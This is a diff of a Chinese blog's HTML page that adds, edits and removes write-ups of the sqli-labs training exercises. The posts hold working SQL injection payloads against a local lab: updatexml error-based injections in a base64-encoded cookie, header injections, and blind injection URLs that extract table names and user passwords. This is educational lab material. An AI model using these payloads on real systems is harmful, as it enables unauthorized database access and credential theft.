@@ -64,6 +64,50 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-sql-labs-Less-21~22" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/02/12/sql-labs-Less-21~22/" class="article-date">
+  <time datetime="2021-02-12T15:18:18.000Z" itemprop="datePublished">2021-02-12</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/02/12/sql-labs-Less-21~22/">sql-labs-Less-21~22</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1>Less-21</h1>
+
+<p>进入<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-21%E5%92%8C%E5%89%8D%E4%B8%A4%E5%85%B3%E4%B8%80%E6%A0%B7%EF%BC%8C%E6%89%93%E5%BC%80http">http://127.0.0.1/sql/Less-21和前两关一样，打开http</a> header live再登陆：</p>
+<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/12/sql-labs-Less-21~22/1.png" alt="1"><br>在http header live中看到我们的cookie变成了YWRtaW4=（图里的%3D是=的url编码，实际上还是前面那个）<br>还有YWRtaW4=其实是经过了base64编码处理的admin，所以我们注入时也要把我们的语句进行base64编码处理。<br>前面几关说到的hackbar就有base64编码的功能，我们可以用它来进行我们的注入：</p>
+<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/12/sql-labs-Less-21~22/2.png" alt="2"><br>上面是对选中的字进行base64转码，下面的是逆转。<br>开始注入：<br>1)判断：uname=YWRtaW4n     (uname=admin’)</p>
+<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/12/sql-labs-Less-21~22/3.png" alt="3"><br>闭合：uname=YWRtaW4nJw==   (uname=admin’’)<br>注释：uname=YWRtaW4nKSM=   (uname=admin’)#)<br>2)爆库：uname=YWRtaW4nYW5kIHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLChzZWxlY3QgZGF0YWJhc2UoKSksMHg3ZSksMSlhbmQn<br>(uname=admin’and updatexml(1,concat(0x7e,(select database()),0x7e),1)and’)<br>爆表：uname=YWRtaW4nYW5kIHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLChzZWxlY3QgdGFibGVfbmFtZSBmcm9tIGluZm9ybWF0aW9uX3NjaGVtYS50YWJsZXMgd2hlcmUgdGFibGVfc2NoZW1hPSdzZWN1cml0eScgbGltaXQgMCwxKSwweDdlKSwxKWFuZCc=<br>(uname=admin’and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=’security’ limit 0,1),0x7e),1)and’)<br>爆列：uname=YWRtaW4nYW5kIHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLChzZWxlY3QgY29sdW1uX25hbWUgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucyB3aGVyZSB0YWJsZV9uYW1lPSd1c2VycycgbGltaXQgMCwxKSwweDdlKSwxKWFuZCc=<br>(uname=admin’and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=’users’ limit 0,1),0x7e),1)and’)<br>注释的话是uname=<code>admin&#39;and updatexml(1,concat(0x7e,(构造的语句),0x7e),1))#</code>，把阴影部分的base64转码就行了。</p>
+<h1>Less-22</h1>
+和Less-21一样，只是把'改成"
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/02/12/sql-labs-Less-21~22/" data-id="ckl3c1h0e0000bkux55147sd5" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-sql-labs-Less-20" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2021/02/12/sql-labs-Less-20/" class="article-date">
@@ -87,10 +131,11 @@
     <div class="article-entry" itemprop="articleBody">
       
         <p>进入<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-20/%EF%BC%8C%E5%92%8C%E5%89%8D%E4%B8%A4%E5%85%B3%E4%B8%80%E6%A0%B7%EF%BC%8C%E6%89%93%E5%BC%80http">http://127.0.0.1/sql/Less-20/，和前两关一样，打开http</a> header live再登陆：</p>
-<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/12/sql-labs-Less-20/1.png" alt="1"><br>我们可以看到我们的user agent、IP地址、cookie、登录名和密码，由20关的题目可以知道要再cookie里注入。<br>打开hackerbar，把相应的地方先填好:</p>
+<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/12/sql-labs-Less-20/1.png" alt="1"><br>我们可以看到我们的user agent、IP地址、cookie、登录名和密码，由20关的题目可以知道要在cookie里注入。<br>打开hackerbar,把相应的地方先填好:</p>
 <p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/12/sql-labs-Less-20/2.png" alt="2"><br>在cookie输入’，发生报错：</p>
-<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/12/sql-labs-Less-20/3.png" alt="3"><br>再输入#(这里不用’是因为虽然没有报错，但有一部分会没有输出)</p>
-<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/12/sql-labs-Less-20/4.png" alt="4"><br>正常输出了，可以注入了：’and updatexml(1,concat(0x7e,(构造的语句),0x7e),1)#，接下来跟前两关差不多了。</p>
+<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/12/sql-labs-Less-20/3.png" alt="3"><br>再输入#(这里如果用’会没有报错，但有一部分会没有输出,但也是可以用的)，正常输出了，说明可以用’注入（也可以看报错中有<code>&#39;admin&#39;</code>）。<br>可以注入了：<br>uname=admin’and updatexml(1,concat(0x7e,(构造的语句),0x7e),1)#<br>uname=admin’and updatexml(1,concat(0x7e,(构造的语句),0x7e),1)and’<br>，接下来跟前两关差不多了。</p>
+<p>ps：cookie也可以登录后再刷新一次，再打开已经打开的http header live，查看：</p>
+<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/12/sql-labs-Less-20/4.png" alt="4"></p>
 
       
     </div>
@@ -130,7 +175,7 @@
         <p>进入<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-19/">http://127.0.0.1/sql/Less-19/</a> ，并登入，显示IP地址和referer与Less-18相似：</p>
 <p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/11/sql-labs-Less-19/1.png" alt="1"><br>因为显示了referer，又因为与Less-18相似，所以我们尝试一下在referer注入。</p>
 <p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/11/sql-labs-Less-19/2.png" alt="2"><br>画横线的部分可以按照Less-18的方法找出来，在referer里输入’，发现报错：</p>
-<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/11/sql-labs-Less-19/3.png" alt="3"><br>且报错语句中有<code>127.0.0.1&#39;)</code>，这时我们可以联想到Less-18，推测出原语句可能是(‘abc’,…,’abc’)这样的。<br>再输入一个’，发现正常登入了，说明可以用’注入。<br>注入语句：<br>1)闭合法：’and updatexml(1,concat(0x7e,(相应的语句),0x7e),1) and’<br>2)注释法：’and updatexml(1,concat(0x7e,(构造的语句),0x7e),1) ,’’,’’)#<br>接下来跟Less-18差不多了。</p>
+<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/11/sql-labs-Less-19/3.png" alt="3"><br>且报错语句中有<code>127.0.0.1&#39;)</code>，这时我们可以联想到Less-18，推测出原语句可能是(‘abc’,…,’abc’)这样的。<br>再输入一个’，发现正常登入了，说明可以用’注入。<br>注入语句：<br>1)闭合法：’and updatexml(1,concat(0x7e,(相应的语句),0x7e),1) and’<br>2)注释法：’and updatexml(1,concat(0x7e,(构造的语句),0x7e),1) ,’’)#<br>接下来跟Less-18差不多了。</p>
 
       
     </div>
@@ -550,84 +595,6 @@
 
 
   
-    <article id="post-sql-labs-Less-5~6" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2021/01/27/sql-labs-Less-5~6/" class="article-date">
-  <time datetime="2021-01-27T13:10:29.000Z" itemprop="datePublished">2021-01-27</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/01/27/sql-labs-Less-5~6/">sql-labs-5~6</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1>Less-5</h1>
-
-<p>进入<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-5/?id=1%E3%80%82">http://127.0.0.1/sql/Less-5/?id=1。</a><br>输入<code>\</code>查看报错，<br>    You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1&#39; LIMIT 0,1’ at line 1<br>发现在<code>&#39;1\&#39; LIMIT 0,1</code>中<code>\</code>后面是<code>&#39;</code>，以此确定用<code>&#39;</code>字符注入。<br>再输入 order by 来判断有几列数据，即<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-5/?id=1&#39;">http://127.0.0.1/sql/Less-5/?id=1&#39;</a> order by 3–+(用二分法)<br>如果输出<code>You are in...........</code>则说明有三列数据。<br>因为没有输出用户名和密码，所以不能用union操作符。<br>可以用ascii函数(只能把字符串的第一个字符转化成ascci码,即只能转一个)、length函数、left函数、regexp函数、like函数、substr函数和mid函数来获取相应的库名、表名、列名和其他数据。<br>先用length()求出数据库名的长度即<br>    <a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-5/?id=1&#39;">http://127.0.0.1/sql/Less-5/?id=1&#39;</a> and length(database())=8–+(二分法，这个函数好像不能求表名和列名的长度)。<br>知道了数据库名的长度，接下来就要求数据库名了，有三种方法(与二分法一起用)：<br>1.left函数<br>首先求数据库名的第一个字符：(下面可以把database()换成(select schema_name from information_schema.schemata limit 4,1))<br>    <a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-5/?id=1&#39;">http://127.0.0.1/sql/Less-5/?id=1&#39;</a> and (left(database(),1) &gt;= ‘a’ and left(database(),1) &lt;= ‘z’)–+(这里可以和ascii函数一起用，即:<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-5/?id=1&#39;">http://127.0.0.1/sql/Less-5/?id=1&#39;</a> and (ascii(left(database(),1)) &gt;= 97 and ascii(left(database(),1)) &lt;= 122)–+)<br>返回正常，然后再尝试<br>    <a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-5/?id=1&#39;">http://127.0.0.1/sql/Less-5/?id=1&#39;</a> and (left(database(),1) &gt;= ‘<code>n</code>‘ and left(database(),1) &lt;= ‘z’)–+<br>返回正常，然后再尝试<br>    <a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-5/?id=1&#39;">http://127.0.0.1/sql/Less-5/?id=1&#39;</a> and (left(database(),1) &gt;= ‘n’ and left(database(),1) &lt;= ‘<code>t</code>‘)–+<br>返回正常，这样依次尝试，最后求出第一位为’s’。<br>再求数据库名的第二个字符：<br>    <a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-5/?id=1&#39;">http://127.0.0.1/sql/Less-5/?id=1&#39;</a> and (left(database(),<code>2</code>) &gt;= ‘sa’ and left(database(),<code>2</code>) &lt;= ‘sz’)–+<br>返回正常，再尝试<br>    <a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-5/?id=1&#39;">http://127.0.0.1/sql/Less-5/?id=1&#39;</a> and (left(database(),2) &gt;= ‘sa’ and left(database(),2) &lt;= ‘sn’)–+<br>最后求出数据库名为’security’。</p>
-<p>接着求security数据库下的第一个表名：<br>    <a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-5/?id=1&#39;">http://127.0.0.1/sql/Less-5/?id=1&#39;</a> and (left((select table_name from information_schema.tables where table_schema=’security’ limit 0,1),1) &gt;= ‘a’ and left((select table_name from information_schema.tables where table_schema=’security’ limit 0,1),1) &lt;= ‘z’)–+<br>这样按照求数据库名的方法求出第一个表名’email’。<br>求第二个表名时只要把’limit 0,1’改成’limit 1,1’就行了。<br>求出来的表名分别为’email’、’referers’、’uagents’、’users’。</p>
-<p>接着求security数据库下的第一个列名：<br>    <a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-5/?id=1&#39;">http://127.0.0.1/sql/Less-5/?id=1&#39;</a> and (left((select column_name from information_schema.columns where table_name=’users’ limit 0,1),1) &gt;= ‘a’ and left((select column_name from information_schema.columns where table_name=’users’ limit 0,1),1) &lt;= ‘z’)–+<br>这里继续按照上面的方法来操作；求出来的列名有：’id’、’username’、’password’。</p>
-<p>最后就是取数据了，首先求id列的数据：(因为数据可能有特殊字符，所以要用ascii函数)<br>    <a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-5/?id=1&#39;">http://127.0.0.1/sql/Less-5/?id=1&#39;</a> and (ascii(left((select id from users  limit 0,1),1)) &gt;= 20 and ascii(left((select id from users limit 0,1),1)) &lt;=126)–+<br>求完id列的数据后，再求username列的数据：<br>    <a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-5/?id=1&#39;">http://127.0.0.1/sql/Less-5/?id=1&#39;</a> and (ascii(left((select username from users  limit 0,1),1)) &gt;= 20 and ascii(left((select username from users limit 0,1),1)) &lt;=126)–+<br>最后在求出password列的数据：<br>    <a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-5/?id=1&#39;">http://127.0.0.1/sql/Less-5/?id=1&#39;</a> and (ascii(left((select password from users  limit 0,1),1)) &gt;= 20 and ascii(left((select password from users limit 0,1),1)) &lt;=126)–+<br>求出来的数据：<br>    <code>id：1,2,3,4,5,6,7,8,9,10,11,12,14</code><br>    <code>username：Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4</code><br>    <code>password：Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4</code><br>2.substr函数、mid函数(看Less-6)<br>3.regexp函数<br>首先求库名：(同样使用二分法)<br>    第一个字符：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-5/?id=1&#39;">http://127.0.0.1/sql/Less-5/?id=1&#39;</a> and database() regexp ‘^[a-z]’–+<br>                <a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-5/?id=1&#39;">http://127.0.0.1/sql/Less-5/?id=1&#39;</a> and database() regexp ‘^[n-z]’–+<br>    求出第一个字符为’s’；<br>    第二个字符：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-5/?id=1&#39;">http://127.0.0.1/sql/Less-5/?id=1&#39;</a> and database() regexp ‘^s[a-z]’–+<br>以此类推，求出库名为’security’。<br>然后求表名：<br>    <a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-5/?id=1&#39;">http://127.0.0.1/sql/Less-5/?id=1&#39;</a> and (select table_name from information_schema.tables where table_schema=’security’ limit <code>0</code>,1) regexp ‘<code>^[a-z]</code>‘–+<br>求第二个表名或字符只需修改上面对应部分。<br>接下来求列名：<br>    <a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-5/?id=1&#39;">http://127.0.0.1/sql/Less-5/?id=1&#39;</a> and (select column_name from information_schema.columns where table_name=’users’ limit 0,1) regexp ‘^[a-z]’–+<br>最后就是取数据了，首先求id列的数据：(因为数据可能有特殊字符，所以后面的范围要大一点，因为ascii()只能把字符串的第一个字符转化成ascci码，所以不用)<br>    <a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-5/?id=1&#39;">http://127.0.0.1/sql/Less-5/?id=1&#39;</a> and (select id from users limit 0,1) regexp ‘^[<code> </code>-<code>~</code>]’–+（这里的范围是从空格到<code>~</code>号，实际上还是ascii码表的大小排序）<br>求完id列的数据后，再求username列的数据：<br>    <a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-5/?id=1&#39;">http://127.0.0.1/sql/Less-5/?id=1&#39;</a> and (select username from users limit 0,1) regexp ‘^[<code> </code>-<code>~</code>]’–+<br>最后在求出password列的数据：<br>    <a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-5/?id=1&#39;">http://127.0.0.1/sql/Less-5/?id=1&#39;</a> and (select password from users limit 0,1) regexp ‘^[<code> </code>-<code>~</code>]’–+</p>
-<h1>Less-6</h1>
-
-<p>进入<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-6/?id=1%E3%80%82">http://127.0.0.1/sql/Less-6/?id=1。</a><br>输入<code>\</code>查看报错，<br>    You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘“1&quot; LIMIT 0,1’ at line 1<br>发现在<code>&quot;1\&quot; LIMIT 0,1</code>中<code>\</code>后面是<code>&quot;</code>，以此确定用<code>&quot;</code>字符注入。<br>再输入 order by 来判断有几列数据，即<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-6/?id=1&quot;">http://127.0.0.1/sql/Less-6/?id=1&quot;</a> order by 3–+(用二分法)<br>如果输出<code>You are in...........</code>则说明有三列数据。<br>因为没有输出用户名和密码，所以不能用union操作符。<br>先用length()求出数据库名的长度即<br>    <a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-6/?id=1&quot;">http://127.0.0.1/sql/Less-6/?id=1&quot;</a> and length(database())=8–+(二分法，这个函数好像不能求表名和列名的长度)。<br>知道了数据库名的长度，接下来就要求数据库名了，有三种方法(与二分法一起用)：<br>1.left函数<br>2.substr函数、mid函数(这里用的是mid函数，如果用substr函数的话只要把mid换成substr)<br>首先求数据库名的第一个字符：<br>    <a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-6/?id=1&quot;">http://127.0.0.1/sql/Less-6/?id=1&quot;</a> and (mid(database(),1,1) &gt;= ‘a’ and mid(database(),1,1) &lt;= ‘z’)–+(这里可以和ascii函数一起用，即:<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-6/?id=1&quot;">http://127.0.0.1/sql/Less-6/?id=1&quot;</a> and (ascii(mid(database(),1,1)) &gt;= 97 and ascii(mid(database(),1,1)) &lt;= 122)–+)<br>返回正常，然后再尝试<br>    <a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-6/?id=1&quot;">http://127.0.0.1/sql/Less-6/?id=1&quot;</a> and (mid(database(),1,1) &gt;= ‘n’ and mid(database(),1,1) &lt;= ‘z’)–+<br>返回正常，然后再尝试<br>    <a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-6/?id=1&quot;">http://127.0.0.1/sql/Less-6/?id=1&quot;</a> and (mid(database(),1,1) &gt;= ‘n’ and mid(database(),1,1) &lt;= ‘t’)–+<br>返回正常，这样依次尝试，最后求出第一位为’s’。<br>求数据库名的第二个字符时，可以这样：<br>    <a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-6/?id=1&quot;">http://127.0.0.1/sql/Less-6/?id=1&quot;</a> and (mid(database(),<code>2</code>,1) &gt;= ‘<code>a</code>‘ and mid(database(),<code>2</code>,1) &lt;= ‘<code>z</code>‘)–+<br>也可以这样：<br>    <a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-6/?id=1&quot;">http://127.0.0.1/sql/Less-6/?id=1&quot;</a> and (mid(database(),1,<code>2</code>) &gt;= ‘<code>sa</code>‘ and mid(database(),1,<code>2</code>) &lt;= ‘<code>sz</code>‘)–+<br>返回正常，再尝试<br>    <a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-6/?id=1&quot;">http://127.0.0.1/sql/Less-6/?id=1&quot;</a> and (mid(database(),<code>2</code>,1) &gt;= ‘<code>a</code>‘ and mid(database(),<code>2</code>,1) &lt;= ‘<code>n</code>‘)–+<br>或<br>    <a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-6/?id=1&quot;">http://127.0.0.1/sql/Less-6/?id=1&quot;</a> and (mid(database(),1,<code>2</code>) &gt;= ‘<code>sa</code>‘ and mid(database(),1,<code>2</code>) &lt;= ‘<code>sn</code>‘)–+<br>最后求出数据库名为’security’。</p>
-<p>接着求security数据库下的第一个表名：<br>    <a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-6/?id=1&quot;">http://127.0.0.1/sql/Less-6/?id=1&quot;</a> and (mid((select table_name from information_schema.tables where table_schema=’security’ limit 0,1),1,1) &gt;= ‘a’ and mid((select table_name from information_schema.tables where table_schema=’security’ limit 0,1),1,1) &lt;= ‘z’)–+<br>这样按照求数据库名的方法求出第一个表名’email’。<br>求第二个表名时只要把’limit 0,1’改成’limit 1,1’就行了。<br>求出来的表名分别为’email’、’referers’、’uagents’、’users’。</p>
-<p>接着求security数据库下的第一个列名：<br>    <a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-6/?id=1&quot;">http://127.0.0.1/sql/Less-6/?id=1&quot;</a> and (mid((select column_name from information_schema.columns where table_name=’users’ limit 0,1),1,1) &gt;= ‘a’ and mid((select column_name from information_schema.columns where table_name=’users’ limit 0,1),1,1) &lt;= ‘z’)–+<br>这里继续按照上面的方法来操作；求出来的列名有：’id’、’username’、’password’。</p>
-<p>最后就是取数据了，首先求id列的数据：(因为数据可能有特殊字符，所以要用ascii函数)<br>    <a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-6/?id=1&quot;">http://127.0.0.1/sql/Less-6/?id=1&quot;</a> and (ascii(mid((select id from users  limit 0,1),1,1)) &gt;= 20 and ascii(mid((select id from users  limit 0,1),1,1)) &lt;= 126)–+<br>求完id列的数据后，再求username列的数据：<br>    <a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-6/?id=1&quot;">http://127.0.0.1/sql/Less-6/?id=1&quot;</a> and (ascii(mid((select username from users  limit 0,1),1,1)) &gt;= 20 and ascii(mid((select username from users  limit 0,1),1,1)) &lt;= 126)–+<br>最后在求出password列的数据：<br>    <a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-6/?id=1&quot;">http://127.0.0.1/sql/Less-6/?id=1&quot;</a> and (ascii(mid((select password from users  limit 0,1),1,1)) &gt;= 20 and ascii(mid((select password from users  limit 0,1),1,1)) &lt;= 126)–+<br>求出来的数据：<br>    <code>id：1,2,3,4,5,6,7,8,9,10,11,12,14</code><br>    <code>username：Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4</code><br>    <code>password：Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4</code><br>3.regexp函数</p>
-<h1>补充</h1>
-1.盲注常用语句：<br>
-    1).left函数<br>
-        left(a,b)——从左侧开始截取a的前b位<br>
-            //select left(database(),2);——在security数据库下为"se"。<br>
-            //select left('abcd',3);——输出abc<br>
-        left(a,b)='c'——判断从左侧开始截取a的前b位是否与c部分相同，是则返回1，否则返回0<br>
-                       //select left(database(),2)='se';——在security数据库下为1。<br>
-    2).regexp函数<br>
-        a regexp 'b(可以是字符(串)也可以是表达式)'——从a的第一位与b进行匹配，如果a的前几项与b相同或符合b表达式，则返回1，否则返回0<br>
-            //select database() regexp 'sec';——在security数据库下时，"security"的前几位与"sec"相同，返回1，<br>
-              若为regexp 'seb'，与"security"的前几位不同，则返回0<br>
-            //select 'abcd' regexp 'ab';——返回1 <br>
-    3).like函数<br>
-        和regexp函数相似，只不过把 regexp 'b'换成了like 'b%'，regexp函数''内可以是一个范围，但like函数不行。<br>
-    4).substr函数<br>
-        substr(a,b,c)——从a的b位置开始截取长度为c的数据<br>
-            //select substr(datebase(),2,3);——在security数据库下为"ecu"。<br>
-        substr(a,b,c)='d'——从a的b位置开始截取长度为c的数据与d比较，如果相同返回1，不同返回0<br>
-            //select substr(database(),2,3)='ecu';——在security数据库下返回1。<br>
-    5).mid函数<br>
-        与substr函数相似，只是把substr改成mid<br>
-以上函数都可以用来求库名、表名、列名。<br>
-    6).ascii函数<br>
-        ascii('a')——返回a的ascii码<br>
-            //select ascii('a');——a的ascii码为97。(只能把字符串的第一个字符转化成ascci码,即只能转一个)<br>
-    7).length函数<br>
-        length(a);——说明a的长度<br>
-            //length(database());——在security数据库下为8。(好像只能求version()、user()、database()、@@datadir、@@version_compile_os的长度)<br>
-2.regexp函数的其他用法：https://blog.csdn.net/weixin_42515907/article/details/104158461
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/01/27/sql-labs-Less-5~6/" data-id="ckkfgvh8t00004kuxfc891zev" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
 
 
   <nav id="page-nav">
@@ -664,6 +631,10 @@
       <ul>
         
           <li>
+            <a href="/2021/02/12/sql-labs-Less-21~22/">sql-labs-Less-21~22</a>
+          </li>
+        
+          <li>
             <a href="/2021/02/12/sql-labs-Less-20/">sql-labs-Less-20</a>
           </li>
         
@@ -677,10 +648,6 @@
         
           <li>
             <a href="/2021/02/09/sql-labs-Less-17/">sql-labs-Less-17</a>
-          </li>
-        
-          <li>
-            <a href="/2021/02/07/sql-labs-Less-13~16/">sql-labs-Less-13~16</a>
           </li>
         
       </ul>
